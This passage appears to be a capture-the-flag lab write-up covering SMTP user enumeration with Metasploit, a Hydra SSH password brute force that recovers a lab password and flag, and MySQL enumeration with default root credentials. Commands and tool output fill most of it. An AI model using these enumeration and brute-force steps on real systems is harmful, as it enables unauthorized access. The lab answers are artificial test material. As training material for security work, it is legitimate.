i. We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from here.
What option do we need to set to the wordlist's path?
sol. USER_FILE
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                   Required  Description
   ----       ---------------                   --------  -----------
   RHOSTS                                       yes       The target host(s), see https://docs.metasploit.com/docs
                                                          /using-metasploit/basics/using-metasploit.html
   RPORT      25                                yes       The target port (TCP)
   THREADS    1                                 yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                              yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/  yes       The file that contains a list of probable users accounts
              data/wordlists/unix_users.txt               .


View the full module info with the info, or info -d command.

j. Once we've set this option, what is the other essential paramater we need to set?
sol. RHOSTS

msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.249.76
RHOSTS => 10.10.249.76
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclists/Usernames/cirt-default-usernames.txt
USER_FILE => /usr/share/seclists/Usernames/cirt-default-usernames.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                   Required  Description
   ----       ---------------                   --------  -----------
   RHOSTS     10.10.249.76                      yes       The target host(s), see https://docs.metasploit.com/docs
                                                          /using-metasploit/basics/using-metasploit.html
   RPORT      25                                yes       The target port (TCP)
   THREADS    1                                 yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                              yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/seclists/Usernames/ci  yes       The file that contains a list of probable users accounts
              rt-default-usernames.txt                    .


View the full module info with the info, or info -d command.

k. Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!
Okay! Now that's finished, what username is returned?
sol. 
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.249.76:25       - 10.10.249.76:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.249.76:25       - 10.10.249.76:25 Users found: (NULL), (any), (created), ADMINISTRATOR, Administrator, BACKUP, MAIL, NEWS, POSTMASTER, SYS, administrator, bin, daemon, games, lp, mail, man, news, nobody, postmaster, root@localhost, sync, sys, uucp
[*] 10.10.249.76:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

TASK 7: Exploiting SMTP
- We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.
- at the end of our Enumeration section we have a few vital pieces of information:
	1. A user account name : administrator
	2. The type of SMTP server and Operating System running : SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
- The syntax for the command we're going to use to find the passwords is this:

	hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh 

Let's break it down:
SECTION				FUNCTION
hydra				Runs the hydra tool
-t 16 	                	Number of parallel connections per target
-l [user]			Points to the user who's account you're trying to compromise
-P [path to dictionary]		Points to the file containing the list of possible passwords
-vV				Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]			The IP address of the target machine
ssh / protocol			Sets the protocol

a. What is the password of the user we found during our enumeration stage?
sol. alejandro
┌──(kali㉿kali)-[~]
└─$ sudo hydra -t 6 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.254.136 ssh
[sudo] password for kali: 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-23 01:30:57
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://10.10.254.136:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://administrator@10.10.254.136:22
[INFO] Successful, password authentication is supported by ssh://10.10.254.136:22
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "rockyou" - 8 of 14344399 [child 2] (0/0)
...
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "12345678" - 9 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "abc123" - 10 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "nicole" - 11 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "daniel" - 12 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "killer" - 143 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "sandra" - 144 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "alejandro" - 145 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.254.136 - login "administrator" - pass "buster" - 146 of 14344399 [child 4] (0/0)
[22][ssh] host: 10.10.254.136   login: administrator   password: alejandro
[STATUS] attack finished for 10.10.254.136 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-23 01:34:25
                                                                                     
b. Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
sol. THM{who_knew_email_servers_were_c00l?}

┌──(kali㉿kali)-[~]
└─$ ssh administrator@10.10.254.136
administrator@10.10.254.136's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 23 05:39:29 UTC 2024

  System load:  0.09              Processes:           89
  Usage of /:   43.9% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.254.136
  Swap usage:   0%


87 packages can be updated.
35 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
administrator@polosmtp:~$ ls
dead.letter  Maildir  smtp.txt
administrator@polosmtp:~$ cat smtp.txt 
THM{who_knew_email_servers_were_c00l?}

TASK 8: Understanding MySQL
- MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). 
- A database is simply a persistent, organised collection of structured data
- A software or service used to create and manage databases based on a relational model.
- The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.
- MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model.
- client and server use a language, specifically the Structured Query Language (SQL) to communicate.
- Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.
- MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.
- The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. 
- This whole process can be broken down into these stages:
	-> MySQL creates a database for storing and manipulating data, defining the relationship of each table.
	-> Clients make requests by making specific statements in SQL.
	-> The server will respond to the client with whatever information has been requested.
- MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.
- The LAMP stack is a popular set of open-source software used for building dynamic websites and web applications. 
- Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:
	~ https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 
	~ https://www.w3schools.com/php/php_mysql_intro.asp

a. What type of software is MySQL?
sol. relational database management system

b. What language is MySQL based on?
sol. SQL

c. What communication model does MySQL use?
sol. client-server

d. What is a common application of MySQL?
sol. back end database

e. What major social network uses MySQL as their back-end database? This will require further research.
sol. Facebook

TASK 9: Enumerating MySQL
- The Scenario
	Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service.
	As this room focuses on exploiting and enumerating the network service, for the sake of the scenario,
	we're going to assume that you found the credentials: "root:password" while enumerating subdomains of a web server.
	After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

a. As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
sol. 3306
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -p- -T4 -A 10.10.77.8        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 21:56 EDT
Stats: 0:05:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.69% done; ETC: 22:11 (0:09:19 remaining)
Stats: 0:08:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.75% done; ETC: 22:12 (0:07:36 remaining)
Nmap scan report for 10.10.77.8
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-04-23T10:13:27
|_Not valid after:  2030-04-21T10:13:27
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, SupportsTransactions, InteractiveClient, FoundRows, Support41Auth, ODBCClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolOld, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: *tI\x08o;>QUHX4-_fQ[\\x18"
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/24%OT=22%CT=1%CU=44114%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:AFEA0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%TS=B)SEQ(
OS:SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=4%ISR=10A%TI=Z%C
OS:I=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508S
OS:T11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5
OS:=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   170.65 ms 10.9.0.1
2   170.85 ms 10.10.77.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 968.88 seconds

b. Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.10.77.8 -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> quit
Bye

c. Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole                
[sudo] password for kali: 
Metasploit tip: View missing module options with show missing
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 

d. We're going to be using the "mysql_sql" module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).
sol. PASSWORD/RHOSTS/USERNAME
msf6 > search mysql_sql

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql

msf6 > use auxiliary/admin/mysql/mysql_sql 
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as


View the full module info with the info, or info -d command.

e. Run the exploit. By default it will test with the "select version()" command, what result does this give you?
sol. 5.7.29-0ubuntu0.18.04.1
msf6 auxiliary(admin/mysql/mysql_sql) > set rhosts 10.10.77.8
rhosts => 10.10.77.8
msf6 auxiliary(admin/mysql/mysql_sql) > set username root
username => root
msf6 auxiliary(admin/mysql/mysql_sql) > set password password
password => password
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD  password          no        The password for the specified username
   RHOSTS    10.10.77.8        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME  root              no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.77.8

[*] 10.10.77.8:3306 - Sending statement: 'select version()'...
[*] 10.10.77.8:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed

f. Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
sol. 4
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD  password          no        The password for the specified username
   RHOSTS    10.10.77.8        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME  root              no        The username to authenticate as


View the full module info with the info, or info -d command.
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
SQL => show databases
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.77.8       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             yes       The target port (TCP)
   SQL       show databases   yes       The SQL to execute.
   USERNAME  root             no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.77.8

[*] 10.10.77.8:3306 - Sending statement: 'show databases'...
[*] 10.10.77.8:3306 -  | information_schema |
[*] 10.10.77.8:3306 -  | mysql |
[*] 10.10.77.8:3306 -  | performance_schema |
[*] 10.10.77.8:3306 -  | sys |
[*] Auxiliary module execution completed

TASK 10: Exploiting MySQL
